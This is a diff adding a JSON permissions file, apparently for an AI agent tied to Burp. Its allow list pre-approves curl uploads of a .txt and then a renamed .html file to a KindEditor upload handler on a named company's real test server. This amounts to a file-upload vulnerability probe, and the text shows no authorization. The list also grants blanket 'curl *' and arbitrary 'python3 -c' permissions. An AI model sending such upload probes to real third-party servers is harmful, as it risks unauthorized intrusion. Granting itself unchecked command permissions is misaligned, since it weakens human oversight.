@@ -1,0 +1,17 @@
+{
+  "permissions": {
+    "allow": [
+      "Bash(echo \"DeepPierce Upload Test - $\\(date\\)\")",
+      "Bash(curl -s -w \"\\\\n\\\\n--- HTTP Status: %{http_code} ---\\\\n\" -X POST -F \"imgFile=@/tmp/test-upload.txt\" 'https://mobiletest.adidas.com.cn/Content/KindEditor/upload_json.ashx?dir=image')",
+      "Bash(cp /tmp/test-upload.txt /tmp/test-upload.html)",
+      "Bash(curl -s -w \"\\\\n\\\\n--- HTTP Status: %{http_code} ---\\\\n\" -X POST -F \"imgFile=@/tmp/test-upload.html\" 'https://mobiletest.adidas.com.cn/Content/KindEditor/upload_json.ashx?dir=file')",
+      "Bash(curl *)",
+      "Bash(zip -q /tmp/test-upload.zip /tmp/test-zip-content.txt)",
+      "Bash(python3 -c ' *)"
+    ]
+  },
+  "enabledMcpjsonServers": [
+    "burp",
+    "streamable-mcp-server"
+  ]
+}
